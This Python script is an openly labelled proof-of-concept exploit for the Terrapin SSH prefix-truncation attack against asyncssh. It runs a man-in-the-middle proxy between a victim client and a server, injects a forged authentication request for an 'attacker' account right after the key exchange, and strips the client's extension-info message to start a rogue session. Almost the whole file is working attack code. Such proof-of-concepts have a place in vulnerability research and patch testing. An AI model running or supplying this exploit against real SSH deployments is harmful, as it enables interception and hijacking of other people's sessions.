"""
This script attacks asyncssh using the Terrapin attack to initiate a rogue session.
"""

import socket
from threading import Thread
from random import randint
import time
import argparse

parser = argparse.ArgumentParser(description="Script to attack asyncssh using the Terrapin attack")
parser.add_argument("--proxy-port", type=int, help="The port number for the proxy server")
parser.add_argument("--server-port", type=int, default=22, help="The port number for the server")
parser.add_argument("--server-ip", type=str, default="127.0.0.1", help="The IP address of the server")

args = parser.parse_args()

PROXY_PORT = args.proxy_port
SERVER_PORT = args.server_port
SERVER_IP = args.server_ip

NEW_KEYS_LENGTH = 16
EXT_INFO_LENGTH = 60
ADDITIONAL_CLIENT_MESSAGES_LENGTH = 80


def main():
    """
    The main function sets up the proxy server, accepts a connection from the victim, and
    establishes a connection to the server. It then starts forwarding data between the victim and the server.
    """
    # Create a socket object
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Bind the socket to the address and port
    s.bind(("0.0.0.0", PROXY_PORT))
    print("Socket bound to address and port")

    # Listen for incoming connections from victims
    s.listen()
    victim_socket, address = s.accept()
    print(f"Connection from {address} on port {PROXY_PORT} has been established!")

    # Set up the connection to the server
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.connect((SERVER_IP, SERVER_PORT))
    print("Connected to server")

    # Start a MITM forwarding proxy
    Thread(target=forward_client_to_server, args=(victim_socket, server_socket)).start()
    Thread(target=forward_server_to_client, args=(victim_socket, server_socket)).start()
    print("Started forwarding data between victim and server")
    s.close()


def classify_message(message):
    """
    Classifies the incoming message as either a protocol message or a BPP message.

    Parameters:
    message (bytes): The message to classify.

    Returns:
    str: The type of message.
    int: The length of the message (if BPP message).
    int: The code of the message (if BPP message).
    """
    if message.startswith(b'SSH'):
        return "Protocol_Message"
    else:
        message_length = int.from_bytes(message[:4], byteorder='big')
        message_code = message[5]
        return "BPP_Message of length " + str(message_length), message_code


def create_attacker_auth_request():
    """
    Creates a malicious user authentication request.

    Returns:
    bytes: The malicious user authentication request.
    """
    user_auth_request = (
        b'\x32\x00\x00\x00\x08attacker\x00\x00\x00\x0essh-connection\x00\x00\x00\x08password'
        b'\x00\x00\x00\x00\x08attacker'
    )
    padding_length = 8 - (len(user_auth_request) + 5) % 8
    packet_length = len(user_auth_request) + padding_length + 1

    return (
        packet_length.to_bytes(4, byteorder='big') +
        padding_length.to_bytes(1, byteorder='big') +
        user_auth_request +
        bytes([randint(0, 255) for _ in range(padding_length)])
    )


def forward_client_to_server(victim_socket, server_socket):
    """
    Forwards data from the client to the server.

    Parameters:
    victim_socket (socket): The socket connected to the victim.
    server_socket (socket): The socket connected to the server.
    """
    new_keys_detected = False
    delay_next = False
    try:
        while True:
            data = victim_socket.recv(4096)
            if not data:
                break
            message_info = classify_message(data)
            if message_info == "Protocol_Message":
                print("Protocol message detected, forwarding data to server")
                server_socket.sendall(data)
                continue

            if delay_next:
                delay_next = False
                print("Delaying the next message by 5 seconds")
                time.sleep(5)

            if not new_keys_detected:
                if message_info[1] == 0x15:
                    print("New keys detected")
                    new_keys_detected = True
                    user_auth_request = create_attacker_auth_request()
                    print("Sending malicious user auth request to server: ", user_auth_request)
                    if len(data) < NEW_KEYS_LENGTH + EXT_INFO_LENGTH + ADDITIONAL_CLIENT_MESSAGES_LENGTH:
                        print(
                            "Data does not contain all messages sent by the client yet. Receiving additional bytes until we have 156 bytes buffered!"
                        )
                        while len(data) < NEW_KEYS_LENGTH + EXT_INFO_LENGTH + ADDITIONAL_CLIENT_MESSAGES_LENGTH:
                            data += victim_socket.recv(4096)
                    server_socket.sendall(
                        user_auth_request +
                        data[:NEW_KEYS_LENGTH] +
                        data[NEW_KEYS_LENGTH + EXT_INFO_LENGTH:]
                    )
                    delay_next = True
                    continue

            print("Data sent to server: ", data)
            server_socket.sendall(data)
    except ConnectionAbortedError:
        print("Connection with victim has been reset")
    print("Forwarding data from victim to server has been completed, closing connection")
    victim_socket.close()
    server_socket.close()


def forward_server_to_client(victim_socket, server_socket):
    """
    Forwards data from the server to the client.

    Parameters:
    victim_socket (socket): The socket connected to the victim.
    server_socket (socket): The socket connected to the server.
    """
    try:
        while True:
            data = server_socket.recv(4096)
            if not data:
                break
            victim_socket.sendall(data)
    except ConnectionAbortedError:
        print("Connection with server has been reset")
    print("Forwarding data from server to victim has been completed, closing connection")
    victim_socket.close()
    server_socket.close()


if __name__ == "__main__":
    main()
